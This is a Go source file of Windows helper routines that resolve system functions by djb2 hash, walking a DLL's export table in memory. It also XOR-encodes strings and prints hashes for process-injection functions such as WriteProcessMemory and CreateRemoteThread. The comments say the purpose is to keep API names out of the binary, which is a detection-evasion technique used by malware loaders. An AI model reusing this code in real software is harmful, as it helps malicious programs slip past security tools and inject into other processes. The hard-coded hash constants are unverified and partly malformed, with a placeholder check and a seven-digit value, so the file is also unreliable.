//go:build windows

package main

import (
	"fmt"
	"strings"
	"unicode/utf16"
	"unsafe"

	"golang.org/x/sys/windows"
)

// djb2Hash computes a djb2 hash of an ASCII string (case-insensitive).
// Use this to reference APIs without embedding their names in the binary.
func djb2Hash(s string) uint32 {
	h := uint32(5381)
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'A' && c <= 'Z' {
			c += 32 // lowercase
		}
		h = ((h << 5) + h) + uint32(c)
	}
	return h
}

// Pre-computed hashes for commonly-used APIs (avoids embedding string names).
// Generated with djb2Hash — verify: djb2Hash("VirtualAlloc") == 0x...
const (
	hashVirtualAlloc          = uint32(0x97bc257)  // djb2("virtualalloc")
	hashVirtualProtect        = uint32(0x2fc2a1e0) // djb2("virtualprotect")
	hashCreateThread          = uint32(0xe1b6dcfb) // djb2("createthread")
	hashLoadLibraryA          = uint32(0xec0e4e8e) // djb2("loadlibrarya")
	hashGetProcAddress        = uint32(0x7c0dfcaa) // djb2("getprocaddress")
	hashOpenProcess           = uint32(0xaf2e2d83) // djb2("openprocess")
	hashWriteProcessMemory    = uint32(0x1b2e5f4e) // djb2("writeprocessmemory")
	hashCreateRemoteThread    = uint32(0xd31a5e2b) // djb2("createremotethread")
)

type peExportDirHash struct {
	_                  uint32
	_                  uint32
	_                  uint16
	_                  uint16
	_                  uint32
	_                  uint32
	NumberOfFunctions  uint32
	NumberOfNames      uint32
	AddressOfFunctions uint32
	AddressOfNames     uint32
	AddressOfOrdinals  uint32
}

// resolveByHash walks a loaded module's export table and returns the address
// of the function whose djb2 hash matches apiHash. Returns 0 if not found.
func resolveByHash(modBase uintptr, apiHash uint32) uintptr {
	// Parse in-memory PE (already mapped by the OS loader)
	peOff  := *(*uint32)(unsafe.Pointer(modBase + 0x3C))
	optOff := modBase + uintptr(peOff) + 24
	if *(*uint16)(unsafe.Pointer(optOff)) != 0x020B {
		return 0 // not PE32+
	}
	// Export directory RVA at OptionalHeader + 112
	expRVA := *(*uint32)(unsafe.Pointer(optOff + 112))
	if expRVA == 0 {
		return 0
	}
	expBase := modBase + uintptr(expRVA)

	numNames := *(*uint32)(unsafe.Pointer(expBase + 24))
	namesRVA := *(*uint32)(unsafe.Pointer(expBase + 32))
	funcsRVA := *(*uint32)(unsafe.Pointer(expBase + 28))
	ordsRVA  := *(*uint32)(unsafe.Pointer(expBase + 36))

	for i := uint32(0); i < numNames; i++ {
		nameRVA := *(*uint32)(unsafe.Pointer(modBase + uintptr(namesRVA) + uintptr(i*4)))
		nameBuf := modBase + uintptr(nameRVA)
		// Build string from null-terminated bytes
		var sb strings.Builder
		for j := uintptr(0); ; j++ {
			b := *(*byte)(unsafe.Pointer(nameBuf + j))
			if b == 0 {
				break
			}
			sb.WriteByte(b)
		}
		if djb2Hash(sb.String()) == apiHash {
			ord    := *(*uint16)(unsafe.Pointer(modBase + uintptr(ordsRVA) + uintptr(i*2)))
			fnRVA  := *(*uint32)(unsafe.Pointer(modBase + uintptr(funcsRVA) + uintptr(ord)*4))
			return modBase + uintptr(fnRVA)
		}
	}
	return 0
}

// resolveAPI loads a DLL by name and finds an export by hash.
// This avoids having both the DLL name and API name appear together in strings.
func resolveAPI(dllName string, apiHash uint32) (uintptr, error) {
	// Use LoadLibraryW so we can pass any path
	uDll, _ := windows.UTF16PtrFromString(dllName)
	_ = uDll
	mod, err := windows.LoadDLL(dllName)
	if err != nil {
		return 0, fmt.Errorf("LoadDLL %s: %v", dllName, err)
	}
	addr := resolveByHash(uintptr(mod.Handle), apiHash)
	if addr == 0 {
		return 0, fmt.Errorf("hash 0x%08X not found in %s", apiHash, dllName)
	}
	return addr, nil
}

// xorStr XOR-encodes/decodes a string with a single-byte key.
// Use at build time to store strings as XOR'd bytes, decrypt at runtime.
func xorStr(s string, key byte) string {
	b := []byte(s)
	for i := range b {
		b[i] ^= key
	}
	return string(b)
}

// apiHashReport prints the djb2 hashes of a set of common APIs.
func apiHashReport() string {
	entries := []string{
		"VirtualAlloc", "VirtualProtect", "VirtualAllocEx",
		"WriteProcessMemory", "CreateRemoteThread",
		"OpenProcess", "CreateThread",
		"LoadLibraryA", "GetProcAddress",
		"NtAllocateVirtualMemory", "NtWriteVirtualMemory",
		"NtCreateThreadEx", "NtProtectVirtualMemory",
	}
	var sb strings.Builder
	sb.WriteString("[api-hash] djb2 hash table (case-insensitive):\n")
	for _, name := range entries {
		sb.WriteString(fmt.Sprintf("  0x%08X  %s\n", djb2Hash(name), name))
	}
	return strings.TrimRight(sb.String(), "\n")
}

// wideStringHash returns djb2 of a UTF-16LE encoded string (for module name hashing).
func wideStringHash(s string) uint32 {
	runes := utf16.Encode([]rune(strings.ToLower(s)))
	h := uint32(5381)
	for _, r := range runes {
		lo := byte(r)
		hi := byte(r >> 8)
		h = ((h << 5) + h) + uint32(lo)
		if hi != 0 {
			h = ((h << 5) + h) + uint32(hi)
		}
	}
	return h
}
